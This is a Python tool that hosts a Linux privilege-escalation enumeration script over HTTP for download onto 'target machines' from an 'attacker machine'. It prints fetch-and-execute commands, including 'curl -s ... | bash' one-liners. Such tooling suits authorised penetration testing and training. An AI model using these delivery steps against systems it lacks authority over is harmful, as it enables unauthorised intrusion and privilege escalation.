#!/usr/bin/env python3
"""
Lintriage Helper - Build Server & Management Tool
A beautiful console interface for serving and managing Lintriage builds.
"""

import os
import sys
import argparse
import http.server
import socketserver
import socket
import time
from pathlib import Path
from datetime import datetime

# Color codes for output
class Colors:
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    RESET = '\033[0m'

# Unicode symbols
CHECK = '✓'
CROSS = '✗'
WARN = '⚠'
INFO = 'ℹ'
ARROW = '➜'
DOT = '•'
STAR = '★'
SERVER = '🌐'
DOWNLOAD = '⬇'
ROCKET = '🚀'

class LintriageHelper:
    def __init__(self):
        self.build_dir = Path(__file__).parent / "builds"
        self.build_file = self.build_dir / "lintriage.sh"
        self.server = None
        
    def print_header(self):
        """Print beautiful header"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}")
        print("""
          ██      ██ ███    ██ ████████ ██████  ██  █████   ██████  ███████ 
          ██      ██ ████   ██    ██    ██   ██ ██ ██   ██ ██       ██      
          ██      ██ ██ ██  ██    ██    ██████  ██ ███████ ██   ███ █████   
          ██      ██ ██  ██ ██    ██    ██   ██ ██ ██   ██ ██    ██ ██      
          ███████ ██ ██   ████    ██    ██   ██ ██ ██   ██  ██████  ███████ 
                                                                                                                  
        Linux Privilege Escalation Auto-Triage Tool              
        Focused enumeration without the noise  
        """)

        print(f"{Colors.RESET}\n")
    
    def print_box(self, title, content_lines, color=Colors.CYAN):
        """Print a box with title and content"""
        print(f"{Colors.BOLD}{color}╔════════════════════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.BOLD}{color}║  {title:<56} ║{Colors.RESET}")
        print(f"{Colors.BOLD}{color}╠════════════════════════════════════════════════════════════╣{Colors.RESET}")
        for line in content_lines:
            print(f"{color}║  {line:<56} ║{Colors.RESET}")
        print(f"{Colors.BOLD}{color}╚════════════════════════════════════════════════════════════╝{Colors.RESET}\n")
    
    def check_build(self):
        """Check if build file exists and get info"""
        if not self.build_file.exists():
            return False, None, None
        
        stat = self.build_file.stat()
        size_kb = stat.st_size / 1024
        mod_time = datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M:%S")
        return True, size_kb, mod_time
    
    def get_local_ip(self):
        """Get the local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            return "127.0.0.1"
    
    def show_status(self):
        """Show current status"""
        self.print_header()
        
        exists, size, mod_time = self.check_build()
        
        status_lines = []
        if exists:
            status_lines.append(f"{Colors.GREEN}{CHECK}{Colors.RESET} Build file: {Colors.BOLD}lintriage.sh{Colors.RESET}")
            status_lines.append(f"  {Colors.DIM}Size: {size:.2f} KB{Colors.RESET}")
            status_lines.append(f"  {Colors.DIM}Modified: {mod_time}{Colors.RESET}")
        else:
            status_lines.append(f"{Colors.RED}{CROSS}{Colors.RESET} Build file: {Colors.RED}NOT FOUND{Colors.RESET}")
            status_lines.append(f"  {Colors.DIM}Expected: {self.build_file}{Colors.RESET}")
        
        if self.server:
            status_lines.append(f"\n{Colors.GREEN}{SERVER}{Colors.RESET} Server: {Colors.GREEN}RUNNING{Colors.RESET}")
            status_lines.append(f"  {Colors.DIM}Port: {self.server.server_address[1]}{Colors.RESET}")
        else:
            status_lines.append(f"\n{Colors.DIM}{SERVER}{Colors.RESET} Server: {Colors.DIM}STOPPED{Colors.RESET}")
        
        self.print_box("Status", status_lines)
    
    def show_download_commands(self, ip, port):
        """Show download commands in a nice format"""
        url = f"http://{ip}:{port}/lintriage.sh"
        
        commands = [
            f"{Colors.BOLD}wget:{Colors.RESET}",
            f"  {Colors.DIM}wget {url} -O lintriage.sh{Colors.RESET}",
            f"  {Colors.DIM}chmod +x lintriage.sh{Colors.RESET}",
            f"  {Colors.DIM}./lintriage.sh{Colors.RESET}",
            "",
            f"{Colors.BOLD}curl:{Colors.RESET}",
            f"  {Colors.DIM}curl {url} -o lintriage.sh{Colors.RESET}",
            f"  {Colors.DIM}chmod +x lintriage.sh{Colors.RESET}",
            f"  {Colors.DIM}./lintriage.sh{Colors.RESET}",
            "",
            f"{Colors.BOLD}One-liner (wget):{Colors.RESET}",
            f"  {Colors.DIM}wget -qO- {url} | bash{Colors.RESET}",
            "",
            f"{Colors.BOLD}One-liner (curl):{Colors.RESET}",
            f"  {Colors.DIM}curl -s {url} | bash{Colors.RESET}",
        ]
        
        self.print_box(f"{DOWNLOAD} Download Commands", commands, Colors.GREEN)
    
    def serve_build(self, port=8000):
        """Serve the lintriage.sh file via HTTP"""
        exists, size, mod_time = self.check_build()
        
        if not exists:
            print(f"\n{Colors.RED}{CROSS}{Colors.RESET} {Colors.RED}Error:{Colors.RESET} Build file not found!")
            print(f"  {Colors.DIM}Expected: {self.build_file}{Colors.RESET}\n")
            return False
        
        self.print_header()
        
        # Show build info
        build_info = [
            f"{Colors.GREEN}{CHECK}{Colors.RESET} Build file ready",
            f"  {Colors.DIM}File: lintriage.sh{Colors.RESET}",
            f"  {Colors.DIM}Size: {size:.2f} KB{Colors.RESET}",
            f"  {Colors.DIM}Modified: {mod_time}{Colors.RESET}",
        ]
        self.print_box("Build Information", build_info, Colors.CYAN)
        
        # Change to builds directory
        os.chdir(self.build_dir)
        
        class BuildHandler(http.server.SimpleHTTPRequestHandler):
            def log_message(self, format, *args):
                timestamp = datetime.now().strftime("%H:%M:%S")
                print(f"{Colors.DIM}[{timestamp}]{Colors.RESET} {Colors.CYAN}{ARROW}{Colors.RESET} {args[0]}")
            
            def end_headers(self):
                # Add CORS headers for easier access
                self.send_header('Access-Control-Allow-Origin', '*')
                super().end_headers()
        
        try:
            with socketserver.TCPServer(("", port), BuildHandler) as httpd:
                self.server = httpd
                local_ip = self.get_local_ip()
                
                # Server info box
                server_info = [
                    f"{Colors.GREEN}{SERVER}{Colors.RESET} Server started successfully",
                    "",
                    f"{Colors.BOLD}Local URL:{Colors.RESET}",
                    f"  {Colors.CYAN}http://127.0.0.1:{port}/lintriage.sh{Colors.RESET}",
                    "",
                    f"{Colors.BOLD}Network URL:{Colors.RESET}",
                    f"  {Colors.CYAN}http://{local_ip}:{port}/lintriage.sh{Colors.RESET}",
                    "",
                    f"{Colors.DIM}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.RESET}",
                ]
                self.print_box(f"{ROCKET} Server Running", server_info, Colors.GREEN)
                
                # Show download commands
                self.show_download_commands(local_ip, port)
                
                # Instructions
                instructions = [
                    f"{Colors.YELLOW}{WARN}{Colors.RESET} Server is now listening for connections",
                    "",
                    f"  {Colors.DIM}• Use the commands above to download on target machine{Colors.RESET}",
                    f"  {Colors.DIM}• Press {Colors.BOLD}Ctrl+C{Colors.RESET} {Colors.DIM}to stop the server{Colors.RESET}",
                    f"  {Colors.DIM}• Server will log all download requests{Colors.RESET}",
                ]
                self.print_box("Instructions", instructions, Colors.YELLOW)
                
                print(f"{Colors.DIM}{'─' * 60}{Colors.RESET}\n")
                print(f"{Colors.GREEN}{CHECK}{Colors.RESET} {Colors.BOLD}Ready to serve builds!{Colors.RESET}\n")
                
                httpd.serve_forever()
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}{WARN}{Colors.RESET} {Colors.YELLOW}Server stopped by user{Colors.RESET}\n")
            self.server = None
            return True
        except OSError as e:
            if "Address already in use" in str(e):
                print(f"\n{Colors.RED}{CROSS}{Colors.RESET} {Colors.RED}Error:{Colors.RESET} Port {port} is already in use")
                print(f"  {Colors.YELLOW}Try a different port:{Colors.RESET} {Colors.CYAN}python lintriage.py serve --port 8080{Colors.RESET}\n")
            else:
                print(f"\n{Colors.RED}{CROSS}{Colors.RESET} {Colors.RED}Error:{Colors.RESET} {e}\n")
            return False
    
    def show_info(self):
        """Show information about the tool"""
        self.print_header()
        
        info_lines = [
            f"{Colors.BOLD}Lintriage Helper{Colors.RESET} - Build Server & Management Tool",
            "",
            f"{Colors.CYAN}{DOT}{Colors.RESET} {Colors.BOLD}Purpose:{Colors.RESET}",
            f"  Serve and manage Lintriage bash builds for target machines",
            "",
            f"{Colors.CYAN}{DOT}{Colors.RESET} {Colors.BOLD}Usage:{Colors.RESET}",
            f"  {Colors.DIM}python lintriage.py serve              # Start server (port 8000){Colors.RESET}",
            f"  {Colors.DIM}python lintriage.py serve --port 8080  # Custom port{Colors.RESET}",
            f"  {Colors.DIM}python lintriage.py status             # Check status{Colors.RESET}",
            f"  {Colors.DIM}python lintriage.py info               # Show this info{Colors.RESET}",
            "",
            f"{Colors.CYAN}{DOT}{Colors.RESET} {Colors.BOLD}Workflow:{Colors.RESET}",
            f"  1. Run {Colors.CYAN}python lintriage.py serve{Colors.RESET} on attacker machine",
            f"  2. Download script on target using wget/curl",
            f"  3. Execute {Colors.CYAN}./lintriage.sh{Colors.RESET} on target machine",
            "",
            f"{Colors.CYAN}{DOT}{Colors.RESET} {Colors.BOLD}Build Location:{Colors.RESET}",
            f"  {Colors.DIM}{self.build_file}{Colors.RESET}",
        ]
        
        self.print_box(f"{INFO} Information", info_lines, Colors.BLUE)

def main():
    parser = argparse.ArgumentParser(
        description="Lintriage Helper - Build Server & Management Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start build server
  python lintriage.py serve

  # Start server on custom port
  python lintriage.py serve --port 8080

  # Check status
  python lintriage.py status

  # Show information
  python lintriage.py info
        """
    )
    
    parser.add_argument(
        'command',
        nargs='?',
        default='info',
        choices=['serve', 'status', 'info'],
        help='Command to execute: serve, status, or info (default: info)'
    )
    
    parser.add_argument(
        '--port',
        type=int,
        default=8000,
        help='Port to serve on (default: 8000)'
    )
    
    args = parser.parse_args()
    
    helper = LintriageHelper()
    
    if args.command == 'serve':
        helper.serve_build(args.port)
    elif args.command == 'status':
        helper.show_status()
    elif args.command == 'info':
        helper.show_info()

if __name__ == '__main__':
    main()
